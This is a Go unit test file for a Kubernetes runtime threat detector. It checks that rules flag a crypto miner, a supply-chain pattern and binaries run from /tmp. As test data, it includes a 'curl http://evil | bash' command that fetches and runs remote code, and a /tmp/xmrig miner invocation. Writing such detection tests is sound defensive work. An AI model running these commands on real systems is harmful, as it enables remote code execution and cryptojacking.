package main

import (
    "testing"
    "time"

    "github.com/nash0810/kubecustos/pkg/models"
)

func TestCheckRules_CryptoMiner(t *testing.T) {
    ev := models.EnrichedEvent{
        Comm:        "xmrig",
        FullCommand: "/tmp/xmrig --arg",
        PodName:     "p1",
        Namespace:   "default",
        NodeName:    "node1",
        Timestamp:   time.Now(),
    }

    a := checkRules(ev)
    if a.RuleName == "" {
        t.Fatalf("expected crypto miner rule to match, got none")
    }
    if a.Severity != "CRITICAL" {
        t.Fatalf("expected severity CRITICAL, got %s", a.Severity)
    }
}

func TestCheckRules_SupplyChain(t *testing.T) {
    ev := models.EnrichedEvent{
        Comm:        "sh",
        FullCommand: "curl http://evil | bash",
        PodName:     "p2",
        Namespace:   "default",
        NodeName:    "node1",
        Timestamp:   time.Now(),
    }
    a := checkRules(ev)
    if a.RuleName == "" {
        t.Fatalf("expected supply chain rule to match, got none")
    }
    if a.Severity != "HIGH" {
        t.Fatalf("expected severity HIGH, got %s", a.Severity)
    }
}

func TestCheckRules_TmpExec(t *testing.T) {
    ev := models.EnrichedEvent{
        Comm:        "malware",
        FullCommand: "/tmp/malware",
        PodName:     "p3",
        Namespace:   "default",
        NodeName:    "node1",
        Timestamp:   time.Now(),
    }
    a := checkRules(ev)
    if a.RuleName == "" {
        t.Fatalf("expected tmp exec rule to match, got none")
    }
    if a.Severity != "MEDIUM" {
        t.Fatalf("expected severity MEDIUM, got %s", a.Severity)
    }
}
